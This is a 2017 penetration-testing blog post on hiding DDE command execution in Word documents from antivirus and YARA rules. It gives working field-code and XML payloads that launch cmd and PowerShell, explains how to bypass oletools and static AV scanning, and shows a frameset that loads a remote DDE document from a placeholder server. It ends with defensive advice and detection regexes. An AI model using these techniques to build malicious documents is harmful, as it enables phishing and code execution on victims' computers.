---
layout: post
title:  "MSWord - Obfuscation with Field Codes"
date:   2017-10-23 15:14:39
categories: pentest phishing dde
---

A few weeks back Saif El-Sherei and I posted on the [SensePost](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/) blog about DDE and getting command exec in MSWord without macros. This post got way more attention than we initially expected it would. Since then DDE has been used in phishing and malware campaigns, as well as legitimate red-team engagements. With the rapid rise in attacks using DDE, detection has been stepped up and most AV engines have basic DDE detection built in. Most of this detection has been based around YARA rules, which identify the **DDE** or **DDEAUTO** strings in .docx and .doc files. This got me wondering if it would be possible to obfuscate the DDE out of the document. One or two attempts at this have emerged, with threat-actors changing the case of the DDE string, and splitting it across multiple lines as described here; [Macroless DOC malware that avoids detection with Yara rule](https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/).

In this post I'll share my attempts at obfuscation and detection bypass. Hopefully this will be helpful for both attack and defence.

1. Obfuscating the payload
2. Hiding DDE/DDEAUTO 
3. Defensive notes

# Payload Obfuscation

Before digging into ways of obfuscating the **DDE** and **DDEAUTO** field codes, I decided to focus on obfuscating the payload. The reason for this being two-fold. Firstly, the payload is simply a string, rather than a reserved field code, meaning obfuscation is less likely to break the functionality. Secondly, we have more room for obfuscation, trying to hide three characters (DDE) is much more of a challenge than obfuscating a 255 character string.

Seeing as we are dealing with field codes already, it felt like a good place to try and find some more obfuscation. A quick search for "*list field codes word*" lead to [this support article by Microsoft](https://support.office.com/en-us/article/List-of-field-codes-in-Word-1ad6d91a-55a7-4a8d-b535-cf7888659a51), which, helpfully, contains a list of all supported field codes. After spending some time going through the various fields, one struck me as possibly helpful. This being the **QUOTE** field, which has the described functionality of "The Quote field inserts the specified text into a document.". This sounded promising as we were looking at ways to manipulate the payload string and the QUOTE field allows for manipulation of a string and inserting it into a document. 

*As a side note*, it is important to remember that field codes can be nested in word, the following is provided as an example is provided for usage of the QUOTE field:
```
{ QUOTE { IF { DATE \@ "M" } = 1 "12" "{= { DATE \@ "M" } -1 }/1/03" \@ "MMMM"} }
```
Here we have nested field codes, the QUOTE field contains the result of the internal IF field code, which inturn contains either the DATE or the formated date, based on a FORMULA (=).

The QUOTE field can be supplied with a characters ordinal value and it will automatically convert this to the corresponding character (I can't find the reference for this unfortunately). As an example, if we wanted to find the character represented by the value 65, we could use the following field in Word:

```
{ QUOTE 65 }
```
Which would end up displaying **A** rather than **65**, which is exactly what we are looking for. We can now represent our payload as integers and have word automatically convert this to a string before executing our DDE. The full set of field codes to make this work would be:

```
{SET c "{QUOTE 65 65 65 65}"}
{SET d "{QUOTE 71 71 71 71}"}
{DDE {REF c} {REF d}}
```

This effectively becomes:
```
{DDE "AAAA" "GGGG"}
```

At this point you can use your imagination and figure out that we would replace **AAAA** and **GGGG** with our relevant payloads. To make this easier, I wrote a quick python script that simply converts a given string into the equivalent QUOTE field.

{% gist staaldraad/df29bd1a840cb53ed2819c1980143166 %}

To pop powershell, we can now use the following:

```
{SET C "{QUOTE 67 58 92 92 80 114 111 103 114 97 109 115 92 92 77 105 99 114 111 115 111 102 116 92 92 79 102 102 105 99 101 92 92 77 83 87 111 114 100 46 101 120 101 92 92 46 46 92 92 46 46 92 92 46 46 92 92 46 46 92 92 119 105 110 100 111 119 115 92 92 115 121 115 116 101 109 51 50 92 92 119 105 110 100 111 119 115 112 111 119 101 114 115 104 101 108 108 92 92 118 49 46 48 92 92 112 111 119 101 114 115 104 101 108 108 46 101 120 101} "}
{DDE {REF C}  "a"}
```

## Dirty links

One thing to note, is that the DDEAUTO is auto updated when the document opens, as the name implies. However, not all field codes are automatically updated unless we have "update links" set on the document. To do this (there might be an easier way than mine), we need to either mark our links as "dirty" or change the document to auto update links.

Once you've created your .docx, you can open the archive with an archive manager and then you need to edit *document.xml*. To mark links as being *dirty* and requiring update add the `w:dirty="true"` to each *begin* `<w:fldChar>`:

```
  <w:fldChar w:fldCharType="begin" w:dirty="true"/>
```

Save document.xml and update the archive. Now when you open the .docx, all links will be auto updated. You also receive the much cleaner "Do you want to update" dialog.

![Update dialog](/assets/update_dialog_dde.png)

## Results

The big question is, have we achieved anything by using **QUOTE**? Turns out, yep. The sample that simply spawns powershell (I'm assuming that Word spawning Powershell is an indicator of maliciousness) has a 1/59 detection ratio on [VirusTotal](https://www.virustotal.com/#/file/cce449cbfa35a3fb22399fa8842b98801b9216df6075e2db8b0e6c519d831e83/detection)

![DDE QUOTE VT](/assets/dde_quote_vt.png)

Normally you would be able to simply resave the .docx as a .doc and get the same code execution. Unfortunately with this method you will receive a *Error! No application specified* error when trying to open the .doc, due to the nested field codes not being updated correctly. There might be a way to force updating of all field codes, but my Word knowledge is limited and I couldn't find one.

# Hiding DDE

The next challenge was to try and hide from some of the existing detections, this included both YARA rules and extraction of DDE links.


## YARA Rules

Most YARA rules I've seen try and detect one or both of DDE and DDEAUTO in the *instrText* elements of a .docx (I focused on .docx as it's easier to modify by hand). One of the very first YARA rules to be released was by [Nviso Labs](https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/) and contained the following Regex:

```
/<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
```

Which worked well on the first batches of malicious docs, but was subsequently bypassed by the multi-line variants. I found another issue with this regex (before reports of the multi-line variants emerged), and reported this to Didier Stevens. When looking into the Office Open XML File format specifications, you'll find that the **fldChar** field is of the "Complex Field" type and can have an optional attribute. Adding this optional attribute both breaks the YARA rule above, and allows us to use DDE rather than DDEAUTO. This attribute is named **dirty** and have the boolean value *true* to force an update as described in the specification "Specifies that this field has been flagged by an application to indicate that its current results are no longer correct".

This is the same attribute I used above in the QUOTE field to force updating of values. To add it to the document, simply do as before and modify the .docx manually.

```
<w:r>
   <w:fldChar w:fldCharType="begin" w:dirty="true"/>
</w:r>
```

The regex immediately fails as it doesn't account for this optional attribute. I submitted the following update to Didier, which should account for both the optional attribute and the fact that the XML can contain arbitrary spaces:

```
<w:fldChar\s+?w:fldCharType="begin"\s+?(w:dirty="(true|false)")?\s+?\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>
```

## Oletools - msodde.py

A really interesting project that I had never tried before this is [python-oletools](https://github.com/decalage2/oletools) by [decalage2](https://twitter.com/decalage2). This works really well in extracting the DDE payloads from all known variants of the DDE "attack". If we use this against our **QUOTE** version, the link gets extracted cleanly and we can still tell that DDE is present:

![Extract DDE Link](/assets/oletools_dde_quote.png)

It would take a bit more work, but you could easily decode those QUOTE values to the string being executed. How should we bypass this?

Going back to the Office Open XML File format (I love specifications), we identify that there is another element that we can use to reference field codes. The one used up till now has been the "Complex Field" of **fldChar**, there is however a "Simple Field" version called, **fldSimple**. The **fldSimple** element doesn't have the same ```<w:instrText>``` child element as the **fldChar** does, it actually includes the field code as an attribute; ```w:instr="FIELD CODE"```.

The example from the specification is:
```
<w:fldSimple w:instr="AUTHOR" w:fldLock="true">
    <w:r>
        <w:t>Rex Jaeschke</w:t>
    </w:r>
</w:fldSimple>
``` 

This can easily be changed to work with DDE and we simple embed our payload as follows:
```
<w:fldSimple w:instr='DDE "C:\\WINDOWS\\system32\\cmd.exe" "/k powershell.exe"' w:dirty="true">
    <w:r>
        <w:t>Pew</w:t>
    </w:r>
</w:fldSimple>
````

This gives us our auto executing DDE, and we bypass Oletools;

![Oletools bypass](/assets/oletools_dde_bypass.png)

I've made a [Pull Request](https://github.com/decalage2/oletools/pull/205) for an update to oletools to detect DDE links embedded in **fldSimple** elements.

This also stacks up pretty well against [AV](https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection) 

![AV bypassed](/assets/dde_av_bypass.png)

Remember that behaviour based AV should be detecting this once the payload executes, so these results should be taken as "bypass or static scanning".

### Side Effects

There are also some side effects that creep in when using fldSimple. If you decide to go with **DDEAUTO** AND include ```w:dirty="true"```, the end user will be prompted 3 times (not sure why three and not two) if they want to execute the DDE application. This does mean you have three chances of them hitting "yes" rather than the usual one. 

Interestingly when launching powershell using the fldSimple and ```c:\\windows\\system32\\cmd.exe /k powershell```, the powershell will be launched inside the cmd window, dropping you straight into the powershell console. This is the same behaviour you would get if you ran powershell from within an existing cmd instance. Unlike the usual DDE that spawns cmd AND powershell. And you'll receive a message of "Cannot load PSReadline module. Console is running without PSReadline" (screenshot). Maybe someone would be interested in digging into this?

![PSReadline](/assets/dde_powershell_fldsimple.png)

## No DDE

Now the ultimate win would be to have no **DDE** or **DDEAUTO** in the document at all, is this possible? It sure is, and has the added benefit of sweetening the Social Engineering aspect. MSWord is nice enough to ask the user to disable protected view in order to see the document contents.

For this, we can abuse another legacy feature (aren't these great). At one point in time Word was billed as a one-stop shop for anything text related, this included creating web pages. Word was an IDE for HTML at one point, the HTML was never pretty but it worked. One of the things introduced around this time was the idea of **frames** and **framesets**. Frames allowed you to load different HTML/Text pages into frames within Word, the HTML was automatically parsed and turned into Word formated content. This functionality seems to have been removed from the UI in Word 2016 (possibly earlier as well), but the underlying parsing routines still remain. This means if you create a document with embedded frames, Word will still process them for you.

To insert a frameset you need to go back to editing a clean .docx. First unzip and then open **webSettings.xml**. You then want to modify add the new XML element **frameset**:
```
<w:frameset>
    <w:framesetSplitbar>
        <w:w w:val="60"/>
        <w:color w:val="auto"/>
        <w:noBorder/>
    </w:framesetSplitbar>
    <w:frameset>
        <w:frame>
            <w:name w:val="1"/>
            <w:sourceFileName r:id="rId1"/>
            <w:linkedToFile/>
        </w:frame>
    </w:frameset>
</w:frameset>
```
This should go inside the existing ```<w:webSettings>``` element, right before the ```<w:optimizeForBrowser/><w:allowPNG/>``` elements. Next you'll need to add **rId1** the relationship that links our document to the external document. 
This is done by adding a new file to `word/_rels/` called, `webSettings.xml.rels`.

The contents of this file should be:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships 
    xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://x.x.x.x/simple.docx" TargetMode="External"/>
</Relationships>
```
Where your target is the .docx file containing the DDE. In this case we are going to load the simple.docx file from the http server at *x.x.x.x*. Save the all the modified/created files, and update the .docx archive. Now you can send the modified file document to your target and they will open it. Because it has the *mark of the web* this will be opened in protected view. However, because Word detects that external content is required for the file to display correctly, the contents will be displayed as: "Linked files and other functionality has been disabled. To restore this functionality, you must Edit this file." - note that this is the default message from Word, we have no control over this.

![Protected View](/assets/externalframe_pv.png)

As soon as Protected View is disabled, Word will download the external document containing our DDE. This does not receive the "mark of the web" and is parsed by Word, triggering the normal DDE messages. This is a pretty useful way of smuggling our DDE payload in without getting scanned by AV. 

# Defence

The best defence seems to be the disabling of auto updating links, don't rely on AV here. The goto resource for changing your Office install to ignore links and prevent auto updating of these was created by [Will Dormannn - @wdormann](https://twitter.com/wdormann) and is available here: [https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b).

Another defensive mechanism that I'm super excited to try out is the introduction of Windows Defender Exploit Guard in the Windows 10 Fall Creators update: [https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard). The beauty of this being that you can prevent Word/Excel/Powerpoint from spawning child processes. This should stop not only this attack but also DDE and embedded OLE etc. Bare in mind, that [Matt Nelson - @enima0x3](https://twitter.com/enigma0x3/) has shown that neither [Outlook nor Access are enrolled in ASR](https://twitter.com/enigma0x3/status/922167827817287680).

As mentioned there is a pull request in the works for updating oletools, and most YARA rules that trigger on the word DDE or DDEAUTO should still work. If you are searching for strings such as **powershell** then you might need to update your logic ;)

